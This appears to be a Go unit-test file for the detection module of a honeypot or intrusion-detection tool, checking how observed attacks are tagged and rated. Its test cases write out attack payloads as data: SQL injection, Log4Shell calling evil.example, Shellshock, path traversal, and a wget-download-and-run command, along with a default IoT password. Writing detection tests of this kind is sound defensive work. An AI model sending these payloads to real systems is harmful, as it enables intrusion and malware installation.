package detect

import (
	"slices"
	"testing"

	"walkingdead/internal/model"
)

func TestHTTPClassification(t *testing.T) {
	cases := []struct {
		path, payload, ua, tag, severity, kind string
	}{
		{"/index.php?id=1%27%20UNION%20SELECT%201,2--", "", "sqlmap/1.7", "sql-injection", "high", "exploit"},
		{"/.env", "", "Mozilla/5.0", "secret-harvesting", "medium", "scan"},
		{"/", "", "${jndi:ldap://evil.example/a}", "log4shell", "critical", "exploit"},
		{"/cgi-bin/test", "", "() { :; }; /bin/bash -c 'id'", "shellshock", "critical", "exploit"},
		{"/download?file=../../etc/passwd", "", "curl/8.0", "path-traversal", "high", "exploit"},
	}
	for _, c := range cases {
		e := model.Event{Service: "http", Type: "connection", Severity: "info", Method: "GET", Path: c.path, Payload: c.payload, UserAgent: c.ua}
		Analyze(&e)
		if !slices.Contains(e.Tags, c.tag) || e.Severity != c.severity || e.Type != c.kind {
			t.Errorf("%s: got tags=%v severity=%s type=%s", c.path, e.Tags, e.Severity, e.Type)
		}
	}
}

func TestShellCommandsAndIOCs(t *testing.T) {
	e := model.Event{Service: "ssh", Type: "command", Severity: "info", Command: "cd /tmp; wget http://198.51.100.9/x.sh; chmod +x x.sh; ./x.sh"}
	Analyze(&e)
	for _, want := range []string{"malware-download", "execution"} {
		if !slices.Contains(e.Tags, want) {
			t.Errorf("missing %s in %v", want, e.Tags)
		}
	}
	if e.Severity != "critical" || !slices.Contains(e.IOCs, "http://198.51.100.9/x.sh") {
		t.Errorf("unexpected severity/iocs: %s %v", e.Severity, e.IOCs)
	}
	recon := model.Event{Service: "ssh", Type: "command", Severity: "info", Command: "uname -a"}
	Analyze(&recon)
	if !slices.Contains(recon.Tags, "discovery") || recon.Severity != "low" {
		t.Errorf("recon: %v %s", recon.Tags, recon.Severity)
	}
	benign := model.Event{Service: "ssh", Type: "command", Severity: "info", Command: "identify"}
	Analyze(&benign)
	if slices.Contains(benign.Tags, "discovery") {
		t.Errorf("word boundary not respected: %v", benign.Tags)
	}
}

func TestDefaultCredentials(t *testing.T) {
	e := model.Event{Service: "telnet", Type: "auth_fail", Severity: "low", User: "root", Password: "xc3511"}
	Analyze(&e)
	if !slices.Contains(e.Tags, "default-credentials") || e.Severity != "medium" {
		t.Errorf("got %v %s", e.Tags, e.Severity)
	}
	if Score([]model.Event{e, e}) <= 0 {
		t.Error("score must be positive")
	}
}
